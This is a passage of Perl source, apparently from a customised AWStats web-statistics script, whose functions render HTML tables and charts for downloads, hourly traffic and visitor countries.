					my $dayname = _t("DayOfWeek_" . $_);
					print "<td"
					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
					  . ">"
					  . (
						!$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear
						? '<span class="currentday">'
						: ''
					  );
					print $dayname;
					print(   !$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear ? '</span>' : '' );
					print "</td>\n";
				}
				print "</tr>\n</table>\n";
			}
			print "<br>";

			# Show data array for days of week
			if ($AddDataArrayShowDaysOfWeekStats) {
				print "<table>";
				print "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Day of week") . "</td>\n";
				if ( $ShowDaysOfWeekStats =~ /P/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_p\""
					  . Tooltip(3)
					  . ">" . _t("Pages") . "</td>\n";
				}
				if ( $ShowDaysOfWeekStats =~ /H/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_h\""
					  . Tooltip(4)
					  . ">" . _t("Hits") . "</td>\n";
				}
				if ( $ShowDaysOfWeekStats =~ /B/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_k\""
					  . Tooltip(5)
					  . ">" . _t("Bandwidth") . "</td>\n</tr>\n";
				}
				for (@DOWIndex) {
					my $dayname = _t("DayOfWeek_" . $_);
					print "<tr"
					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
					  . ">";
					print "<td>"
					  . (
						!$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear
						? '<span class="currentday">'
						: ''
					  );
					print $dayname;
					print(   !$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear ? '</span>' : '' );
					print "</td>\n";
					if ( $ShowDaysOfWeekStats =~ /P/i ) {
						print "<td>", Format_Number(int($avg_dayofweek_p[$_])), "</td>\n";
					}
					if ( $ShowDaysOfWeekStats =~ /H/i ) {
						print "<td>", Format_Number(int($avg_dayofweek_h[$_])), "</td>\n";
					}
					if ( $ShowDaysOfWeekStats =~ /B/i ) {
						print "<td>", Format_Bytes(int($avg_dayofweek_k[$_])),
						  "</td>\n";
					}
					print "</tr>\n";
				}
				print "</table>\n<br>";
			}

			print "</center></td>\n";
			print "</tr>\n";
			&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads chart and table
# Parameters:   -
# Input:        $NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDownloads{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if (!($LevelForFileTypesDetection > 0)){return;}
	if ($Debug) { debug( "ShowDownloadStats", 2 ); }
	
	my $regext = qr/\.(\w{1,6})$/;
	print "$Center<a name=\"downloads\">&nbsp;</a>";
	
	my $Totalh = 0;
	if ($MaxNbOf{'DownloadsShown'} < 1){$MaxNbOf{'DownloadsShown'} = 10;}
	
	# 标题
	my $title = "⬇️ " . _t("Downloads") . " (" . _t("Top") . " $MaxNbOf{'DownloadsShown'}) &nbsp; - &nbsp; <a href=\""
	  . ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=downloads")
		: "$StaticLinks.downloads.$StaticExt" )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		$title .= " &nbsp; - &nbsp; <a href=\"" 
			. (XMLEncode( "$AddLinkToExternalCGIWrapper" 
			. "?section=DOWNLOADS&baseName=$DirData/$PROG"
			. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
			. "&siteConfig=$SiteConfig" )
			. "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
	  
	&tab_head( "$title", 0, 0, 'downloads' );
	
	# 计算前5名用于饼图
	my $cnt = 0;
	my @top_downloads = ();
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
		$Totalh += $_downloads{$u}->{'AWSTATS_HITS'};
		push @top_downloads, $u;
		$cnt++;
		last if $cnt >= 5;
	}
	
	# 饼图
	if ($Totalh > 0 && scalar keys %_downloads > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } ) {
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			for my $u (@top_downloads) {
				my $filename = Get_Filename($u);
				push @valdata, int($_downloads{$u}->{'AWSTATS_HITS'} / $Totalh * 1000) / 10;
				push @blocklabel, $filename;
				$cnt++;
				last if $cnt >= 5;
			}
			
			# 动态计算列数
			my $columns = 2;  # 图标列 + 文件名列
			$columns += 2 if $ShowDownloadsStats =~ /H/i;  # Hits + 206
			$columns += 2 if $ShowDownloadsStats =~ /B/i;  # Bandwidth + Avg
			$columns += 1 if $ShowDownloadsStats =~ /C/i;  # Complete
			$columns += 1 if $ShowDownloadsStats =~ /M/i;  # Mobile
			$columns += 1 if $ShowDownloadsStats =~ /T/i;  # Last time
			$columns += 1;  # 进度条列
			
			print "<td colspan=\"$columns\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Top Downloads"), "downloads",
				0, \@blocklabel,
				0, \@valcolor,
				0, 0,
				0, \@valdata
			);
			print "<\/td><\/tr>";
		}
	}
	my $total_dls = scalar keys %_downloads;
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th colspan=\"2\">" . _t("Downloads") . ": $total_dls</th>\n";
	
	# 根据 ShowDownloadsStats 的值动态添加表头
	if ( $ShowDownloadsStats =~ /H/i ){
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
		print "<th bgcolor=\"#$color_h\" width=\"100\">" . _t("Pause & Go") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /B/i ){
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /C/i ){
		print "<th bgcolor=\"#$color_c\" width=\"80\">" . _t("Complete") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /M/i ){
		print "<th bgcolor=\"#$color_m\" width=\"80\">" . _t("Mobile") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /T/i ){
		print "<th bgcolor=\"#$color_t\" width=\"80\">" . _t("Last") . "</th>\n";
	}
	print "<th>&nbsp;</th>\n";
	print "<\/tr>";
	my $count = 0;
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
		print "<tr valign=\"middle\">";
		
		# 图标列
		my $ext = Get_Extension($regext, $u);
		if ( !$ext ) {
			print "<td class=\"aws\" width=\"$WIDTHCOLICON\" align=\"center\">"
				. "<img src=\"$DirIcons\/mime\/unknown.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />"
				. "<\/td>";
		} else {
			my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
			print "<td class=\"aws\" width=\"$WIDTHCOLICON\" align=\"center\">"
				. "<img src=\"$DirIcons\/mime\/$nameicon.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />"
				. "<\/td>";
		}
		
		# 文件名列
		print "<td class=\"aws\">";
		&HTMLShowURLInfo($u);
		print "<\/td>";
		
		# Hits 统计
		if ( $ShowDownloadsStats =~ /H/i ){
			my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
			print "<td class=\"aws\" bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($hits) . "<\/td>";
			print "<td class=\"aws\" bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($hits206) . "<\/td>";
		}
		
		# 带宽统计
		if ( $ShowDownloadsStats =~ /B/i ){
			my $size = $_downloads{$u}->{'AWSTATS_SIZE'} || 0;
			my $total_ops = ($_downloads{$u}->{'AWSTATS_HITS'} || 0) + ($_downloads{$u}->{'AWSTATS_206'} || 0);
			my $avg = $total_ops > 0 ? $size / $total_ops : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($size) . "<\/td>";
			print "<td class=\"aws\" bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($avg) . "<\/td>";
		}
		
		# 完成率
		if ( $ShowDownloadsStats =~ /C/i ){
			my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
			my $complete = $hits - $hits206;
			my $rate = $hits > 0 ? int($complete / $hits * 100) : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_c\" align=\"right\">"
				. Format_Number($complete) . " ($rate%)"
				. "<\/td>";
		}
		
		# 移动设备统计
		if ( $ShowDownloadsStats =~ /M/i ){
			my $mobile = $_downloads{$u}->{'AWSTATS_MOBILE'} || 0;
			my $pct = $Totalh > 0 ? int($mobile / $Totalh * 100) : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_m\" align=\"right\">"
				. Format_Number($mobile) . " ($pct%)"
				. "<\/td>";
		}
		
		# 最后下载时间
		if ( $ShowDownloadsStats =~ /T/i ){
			my $last = $_downloads{$u}->{'AWSTATS_LAST_TIME'} || 0;
			print "<td class=\"aws\" bgcolor=\"#$color_t\" align=\"right\" nowrap=\"nowrap\">"
				. ($last ? Format_Date($last, 1) : '-')
				. "<\/td>";
		}
		
		# 进度条（基于完成率）
		my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
		my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
		my $complete_rate = $hits > 0 ? ($hits - $hits206) / $hits : 0;
		my $bar_width = int($BarWidth * $complete_rate);
		$bar_width = 2 if $bar_width == 1 && $complete_rate > 0;
		
		print "<td class=\"aws\">";
		if ($ShowDownloadsStats) {
			print "<div style=\"background-color: #$color_p; width: ${bar_width}px; height: 8px; border-radius: 4px;\" title=\"" . _t("Complete rate") . ": " . int($complete_rate * 100) . "%\"></div>";
		}
		print "<\/td>";
		
		print "<\/tr>";
		$count++;
		last if $count >= $MaxNbOf{'DownloadsShown'};
	}
	my $rest_hits = 0;
	my $rest_206 = 0;
	my $rest_size = 0;
	my $rest_mobile = 0;
	my $displayed_count = 0;
	
	for my $u (keys %_downloads) {
		if ($displayed_count >= $MaxNbOf{'DownloadsShown'}) {
			$rest_hits += $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			$rest_206 += $_downloads{$u}->{'AWSTATS_206'} || 0;
			$rest_size += $_downloads{$u}->{'AWSTATS_SIZE'} || 0;
			$rest_mobile += $_downloads{$u}->{'AWSTATS_MOBILE'} || 0;
		}
		$displayed_count++;
	}
	
	if ($rest_hits > 0) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span><\/td>";
		if ( $ShowDownloadsStats =~ /H/i ){
			print "<td bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($rest_hits) . "<\/td>";
			print "<td bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($rest_206) . "<\/td>";
		}
		if ( $ShowDownloadsStats =~ /B/i ){
			print "<td bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($rest_size) . "<\/td>";
			my $avg = $rest_hits + $rest_206 > 0 ? $rest_size / ($rest_hits + $rest_206) : 0;
			print "<td bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($avg) . "<\/td>";
		}
		if ( $ShowDownloadsStats =~ /C/i ){
			print "<td bgcolor=\"#$color_c\" align=\"right\">&nbsp;<\/td>";
		}
		if ( $ShowDownloadsStats =~ /M/i ){
			print "<td bgcolor=\"#$color_m\" align=\"right\">&nbsp;<\/td>";
		}
		if ( $ShowDownloadsStats =~ /T/i ){
			print "<td bgcolor=\"#$color_t\" align=\"right\">&nbsp;<\/td>";
		}
		print "<td>&nbsp;<\/td>";
		print "<\/tr>";
	}
	
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the hours chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHours{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
		
	if ($Debug) { debug( "ShowHoursStats", 2 ); }
	print "$Center<a name=\"hours\">&nbsp;</a>";
	my $title = "🕒 " . _t("Hourly Page Views");
	
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		$title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			"$AddLinkToExternalCGIWrapper" . "?section=TIME&baseName=$DirData/$PROG"
		. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		. "&siteConfig=$SiteConfig" )
		. "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	
	if ( $PluginsLoaded{'GetTimeZoneTitle'}{'timezone'} ) {
		$title .= " (GMT "
		  . ( GetTimeZoneTitle_timezone() >= 0 ? "+" : "" )
		  . int( GetTimeZoneTitle_timezone() ) . ")";
	}
	&tab_head( "$title", 19, 0, 'hours' );
	print "<tr><td align=\"center\">";
	print "<center>";

	my $max_h = my $max_k = 1;
	for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
		if ( $_time_h[$ix] > $max_h ) { $max_h = $_time_h[$ix]; }
		if ( $_time_k[$ix] > $max_k ) { $max_k = $_time_k[$ix]; }
	}

	# Show bars for hour
	my $graphdone = 0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } ) {
		my @blocklabel = ( 0 .. 23 );
		my @vallabel   = ( _t("Pages"), _t("Hits"), _t("Bandwidth") );
		my @valcolor   = ( "$color_p", "$color_h", "$color_k" );
		my @valmax     = ( int($max_h), int($max_h), int($max_k) );
		my @valtotal   = ( $TotalPages, $TotalHits, $TotalBytes );
		my @valaverage = ( $AveragePages, $AverageHits, $AverageBytes );
		my @valdata    = ();
		my $xx         = 0;
		for ( 0 .. 23 ) {
			$valdata[ $xx++ ] = $_time_p[$_] || 0;
			$valdata[ $xx++ ] = $_time_h[$_] || 0;
			$valdata[ $xx++ ] = $_time_k[$_] || 0;
		}
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title", "hours",
			$ShowHoursStats, \@blocklabel,
			\@vallabel, \@valcolor,
			\@valmax, \@valtotal,
			\@valaverage, \@valdata
		);
		$graphdone=1;
	}
	
	if ( !$graphdone ) {
		print "<table>";
		print "<tr valign=\"bottom\">";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;
			if ( $max_h > 0 ) {
				$bredde_p =
				  int( $BarHeight * $_time_p[$ix] / $max_h ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( $BarHeight * $_time_h[$ix] / $max_h ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k =
				  int( $BarHeight * $_time_k[$ix] / $max_k ) + 1;
			}
			print "<td>";
			if ( $ShowHoursStats =~ /P/i ) {
				print "<div style=\"background-color: #$color_p; width: 6px; height: ${bredde_p}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Pages") . ": " . int( $_time_p[$ix] ) . "\"></div>";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print "<div style=\"background-color: #$color_h; width: 6px; height: ${bredde_h}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Hits") . ": " . int( $_time_h[$ix] ) . "\"></div>";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print "<div style=\"background-color: #$color_k; width: 6px; height: ${bredde_k}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $_time_k[$ix] ) . "\"></div>";
			}
			print "</td>\n";
		}
		print "</tr>\n";

		# Show hour lib
		print "<tr" . Tooltip(17) . ">";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			print "<th width=\"19\">$ix</th>";
		}
		print "</tr>\n";

		# Show clock icon with internationalized time period tooltips
		print "<tr" . Tooltip(17) . ">";
		
		# Define emoji mapping for 24 hours
		my %hour_emoji = (
			0 => '🕛', 1 => '🕐', 2 => '🕑', 3 => '🕒', 4 => '🕓', 5 => '🕔',
			6 => '🕕', 7 => '🕖', 8 => '🕗', 9 => '🕘', 10 => '🕙', 11 => '🕚',
			12 => '🕛', 13 => '🕐', 14 => '🕑', 15 => '🕒', 16 => '🕓', 17 => '🕔',
			18 => '🕕', 19 => '🕖', 20 => '🕗', 21 => '🕘', 22 => '🕙', 23 => '🕚'
		);
		
		# Define period text mapping with internationalization
		# 定义 24 小时独立翻译
		my %period_text = (
			0  => _t("period_00"),
			1  => _t("period_01"),
			2  => _t("period_02"),
			3  => _t("period_03"),
			4  => _t("period_04"),
			5  => _t("period_05"),
			6  => _t("period_06"),
			7  => _t("period_07"),
			8  => _t("period_08"),
			9  => _t("period_09"),
			10 => _t("period_10"),
			11 => _t("period_11"),
			12 => _t("period_12"),
			13 => _t("period_13"),
			14 => _t("period_14"),
			15 => _t("period_15"),
			16 => _t("period_16"),
			17 => _t("period_17"),
			18 => _t("period_18"),
			19 => _t("period_19"),
			20 => _t("period_20"),
			21 => _t("period_21"),
			22 => _t("period_22"),
			23 => _t("period_23"),
		);
		
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			my $hrs = ( $ix >= 12 ) ? $ix - 12 : $ix;
			$hrs = 12 if $hrs == 0;
			my $hre = ( $ix >= 12 ) ? $ix - 11 : $ix + 1;

			my $period = $period_text{$ix};
			my $title_text = sprintf("%d:00 - %d:00 %s", $hrs, $hre, $period);
			my $emoji = $hour_emoji{$ix};

			print "<td style=\"text-align:center; font-size:1.5em;\" title=\"$title_text\">$emoji</td>\n";
		}
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br>";

	# Show data array for hours
	if ($AddDataArrayShowHoursStats) {
		print "<table width=\"650\"><tr>";
		print "<td align=\"center\"><center>";

		print "<table>\n";
		print "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Hours") . "</td>\n";

		if ( $ShowHoursStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>\n";
		}
		if ( $ShowHoursStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>\n";
		}
		if ( $ShowHoursStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>\n";
		}
		print "</tr>\n";
		for ( my $ix = 0 ; $ix <= 11 ; $ix++ ) {
			my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
			print "<tr>";
			print "<td>$monthix</td>\n";
			if ( $ShowHoursStats =~ /P/i ) {
				print "<td>",
				  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
				  "</td>\n";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print "<td>",
				  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
				  "</td>\n";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
				  "</td>\n";
			}
			print "</tr>\n";
		}
		print "</table>\n";

		print "</center></td>\n";
		print "<td width=\"10\">&nbsp;</td>\n";
		print "<td align=\"center\"><center>";

		print "<table>\n";
		print "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Hours") . "</td>\n";
		if ( $ShowHoursStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>\n";
		}
		if ( $ShowHoursStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>\n";
		}
		if ( $ShowHoursStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>\n";
		}
		print "</tr>\n";
		for ( my $ix = 12 ; $ix <= 23 ; $ix++ ) {
			my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
			print "<tr>";
			print "<td>$monthix</td>\n";
			if ( $ShowHoursStats =~ /P/i ) {
				print "<td>",
				  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
				  "</td>\n";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print "<td>",
				  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
				  "</td>\n";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
				  "</td>\n";
			}
			print "</tr>\n";
		}
		print "</table>\n";

		print "</center>\n</td>\n</tr>\n</table>\n";
		print "<br>";
	}

	print "</center>\n</td>\n</tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the countries chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCountries{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowDomainsStats", 2 ); }
	print "$Center<a name=\"countries\">&nbsp;</a>";
	my $title = "🌍 " . _t("Countries") . " (" . _t("Top") 
	  . " $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=alldomains")
		: "$StaticLinks.alldomains.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	  

	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=DOMAIN&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
			  
	&tab_head( "$title", 19, 0, 'countries' );
	
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_h = 1;
	foreach ( values %_domener_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_domener_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	
	&BuildKeyList(
		$MaxNbOf{'Domain'}, $MinHit{'Domain'},
		\%_domener_h,       \%_domener_p
	);
	
	# print the map
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_domener_h{$key} );
				push @blocklabel, $DomainsHashIDLib{$key};
				$cnt++;
				if ($cnt > 99) { last; }
			}
			print "<tr><td colspan=\"7\" align=\"center\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"AWStatsCountryMap", "countries_map",
				0, \@blocklabel,
				0, 0,
				0, 0,
				0, \@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">" . _t("flag_icon") . "</th>\n<th>" . _t("Country-Region-City") . "</th>\n<th>" . _t("Code") . "</th>\n";

	## to add unique visitors and number of visits by calculation of average of the relation with total
	## pages and total hits, and total visits and total unique
	## by Josep Ruano @ CAPSiDE
	if ( $ShowDomainsStats =~ /U/i ) {
		print "<th bgcolor=\"#$color_u\" width=\"80\""
		  . Tooltip(2)
		  . ">" . _t("Unique visitors") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /V/i ) {
		print "<th bgcolor=\"#$color_v\" width=\"80\""
		  . Tooltip(1)
		  . ">" . _t("Visits") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n";
	}
	print "<th>&nbsp;</th>\n";
	print "</tr>\n";
	
	foreach my $key (@keylist) {
		my ( $_domener_u, $_domener_v );
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		my $bredde_u = 0;
		my $bredde_v = 0;
		if ( $max_h > 0 ) {
			$bredde_p =
			  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
		}
		if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
			  1;
		}
		if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
		my $newkey = lc($key);

		# 获取显示用的完整位置和国家代码
		my $display_name = '';
		my $country_code = '';
		if (exists $TmpDomainFullLocation{$newkey}) {
			$display_name = $TmpDomainFullLocation{$newkey}->{display};
			$country_code = $TmpDomainFullLocation{$newkey}->{code};
		} else {
			# 回退：将键名中的下划线转回空格
			$display_name = $key;
			$display_name =~ s/_/ /g;
			# 提取国家名称并尝试查找代码
			my $country_name = '';
			if ($display_name =~ /^([^,]+),/) {
				$country_name = $1;
			} else {
				$country_name = $display_name;
			}
			# 通过国家名称查找代码
			foreach my $code (keys %DomainsHashIDLib) {
				if (lc($DomainsHashIDLib{$code}) eq lc($country_name)) {
					$country_code = $code;
					last;
				}
			}
			$country_code = lc(substr($country_name, 0, 2)) unless $country_code;
		}

		if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
			print "<tr><td width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\">" . country_code_to_emoji($country_code) . "<\/td><td class=\"aws\">$display_name<\/td><td class=\"aws\">" . uc($country_code) . "<\/td>";
		}
		else {
			print "<tr><td width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\">" . country_code_to_emoji($country_code) . "<\/td><td class=\"aws\">$display_name<\/td><td class=\"aws\">" . uc($country_code) . "<\/td>";
		}
		## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
		if ( $ShowDomainsStats =~ /U/i ) {
			$_domener_u = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_u += ( $_domener_h{$key} / $TotalHits );
			$_domener_u =
			  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
			print "<td>".Format_Number($_domener_u)." ("
			  . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
			  . ")</td>\n";
		}
		if ( $ShowDomainsStats =~ /V/i ) {
			$_domener_v = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_v += ( $_domener_h{$key} / $TotalHits );
			$_domener_v =
			  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
			print "<td>".Format_Number($_domener_v)." ("
			  . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
			  . ")</td>\n";
		}

		if ( $ShowDomainsStats =~ /P/i ) {
			print "<td>"
			  . ( $_domener_p{$key} ? Format_Number($_domener_p{$key}) : '&nbsp;' )
			  . "</td>\n";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<td>".Format_Number($_domener_h{$key})."</td>\n";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>\n";
		}
		print "<td class=\"aws\">";
		if ( $ShowDomainsStats =~ /P/i ) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px; margin-bottom: 2px;\" title=\"" . _t("Pages") . ": " . int( $_domener_p{$key} ) . "\"></div>";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px; margin-bottom: 2px;\" title=\"" . _t("Hits") . ": " . int( $_domener_h{$key} ) . "\"></div>";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
